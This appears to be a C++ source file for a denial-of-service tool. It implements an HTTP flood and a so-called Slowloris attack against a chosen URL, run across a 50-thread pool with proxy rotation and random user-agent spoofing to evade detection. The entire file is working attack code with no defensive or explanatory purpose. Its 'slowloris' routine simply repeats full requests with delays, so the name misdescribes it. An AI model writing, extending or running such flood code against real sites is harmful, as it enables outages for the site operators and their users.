#include "attacker.h"
#include <curl/curl.h>
#include <thread>
#include <iostream>
#include <vector>
#include <random>
#include "curl_utils.h"

std::atomic<bool> Attacker::attacking(false);
std::atomic<bool> Attacker::paused(false);
std::atomic<int> Attacker::successful_requests_(0);
std::atomic<int> Attacker::failed_requests_(0);
ctpl::thread_pool Attacker::pool(50); // Max 50 thread

std::string Attacker::get_random_user_agent() {
    static const std::vector<std::string> user_agents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    };
    static std::mt19937 rng(static_cast<unsigned>(std::chrono::system_clock::now().time_since_epoch().count()));
    std::uniform_int_distribution<size_t> dist(0, user_agents.size() - 1);
    return user_agents[dist(rng)];
}

void Attacker::http_flood(const std::string &url, int requests, const int rps, const std::string &custom_header, const bool verify_ssl,
                          const ProxyManager &proxy) {
    const std::unique_ptr<CURL, CurlUtils::curl_deleter> curl(curl_easy_init());
    std::unique_ptr<curl_slist, CurlUtils::curl_slist_deleter> headers(nullptr);
    if (curl.get()) {
        curl_easy_setopt(curl.get(), CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl.get(), CURLOPT_WRITEFUNCTION, CurlUtils::write_callback);
        curl_easy_setopt(curl.get(), CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_easy_setopt(curl.get(), CURLOPT_SSL_VERIFYPEER, verify_ssl ? 1L : 0L);
        curl_easy_setopt(curl.get(), CURLOPT_SSL_VERIFYHOST, verify_ssl ? 2L : 0L);
        curl_easy_setopt(curl.get(), CURLOPT_USERAGENT, get_random_user_agent().c_str());
        if (!custom_header.empty()) {
            headers.reset(curl_slist_append(nullptr, custom_header.c_str()));
            curl_easy_setopt(curl.get(), CURLOPT_HTTPHEADER, headers.get());
        }
        if (proxy.is_enabled()) {
            curl_easy_setopt(curl.get(), CURLOPT_PROXY, proxy.get_random_proxy().c_str());
        }
        const int delayMs = rps > 0 ? 1000 / rps : 0;
        while (attacking && requests--) {
            if (paused) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                continue;
            }
            int retries = 3;
            while (retries-- && attacking) {
                const CURLcode res = curl_easy_perform(curl.get());
                if (res == CURLE_OK) {
                    ++successful_requests_;
                    std::cout << "Sent request to " << url << std::endl;
                    break;
                }
                ++failed_requests_;
                std::cerr << "Request failed: " << curl_easy_strerror(res) << std::endl;
                if (proxy.is_enabled())
                    curl_easy_setopt(curl.get(), CURLOPT_PROXY, proxy.get_random_proxy().c_str());
            }
            if (delayMs > 0) std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));
        }
        if (headers) curl_slist_free_all(headers.get());
        curl_easy_cleanup(curl.get());
    }
}

void Attacker::slowloris(const std::string &url, const ProxyManager &proxy) {
    const std::unique_ptr<CURL, CurlUtils::curl_deleter> curl(curl_easy_init());
    if (curl.get()) {
        curl_easy_setopt(curl.get(), CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl.get(), CURLOPT_WRITEFUNCTION, CurlUtils::write_callback);
        curl_easy_setopt(curl.get(), CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_easy_setopt(curl.get(), CURLOPT_TCP_KEEPALIVE, 1L);
        curl_easy_setopt(curl.get(), CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl.get(), CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl.get(), CURLOPT_USERAGENT, get_random_user_agent().c_str());
        if (proxy.is_enabled()) {
            curl_easy_setopt(curl.get(), CURLOPT_PROXY, proxy.get_random_proxy().c_str());
        }
        std::mt19937 rng(static_cast<unsigned>(std::chrono::system_clock::now().time_since_epoch().count()));
        std::uniform_int_distribution<int> dist(500, 2000);
        while (attacking) {
            if (paused) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                continue;
            }
            const CURLcode res = curl_easy_perform(curl.get());
            if (res == CURLE_OK) {
                ++successful_requests_;
                std::cout << "Slowloris request to " << url << std::endl;
            }
            else {
                ++failed_requests_;
                std::cerr << "Request failed: " << curl_easy_strerror(res) << std::endl;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(dist(rng)));
        }
        curl_easy_cleanup(curl.get());
    }
}

void Attacker::start(const std::string &url, const std::string &type, const int threads, int requests, int rps,
                     const std::string &custom_header, bool verify_ssl, const ProxyManager &proxy) {
    attacking = true;
    paused = false;
    successful_requests_ = 0;
    failed_requests_ = 0;
    for (int i = 0; i < threads; ++i) {
        if (type == "HTTP Flood") {
            pool.push([url, requests, rps, custom_header, verify_ssl, proxy](int) {
                http_flood(url, requests, rps, custom_header, verify_ssl, proxy);
            });
        }
        else if (type == "Slowloris") {
            pool.push([url, proxy](int) { slowloris(url, proxy); });
        }
    }
}

void Attacker::stop() {
    attacking = false;
}

void Attacker::pause() {
    paused = !paused;
}

bool Attacker::is_paused() {
    return paused;
}

bool Attacker::is_attacking() {
    return attacking;
}

int Attacker::get_successful_requests() {
    return successful_requests_.load();
}

int Attacker::get_failed_requests() {
    return failed_requests_.load();
}
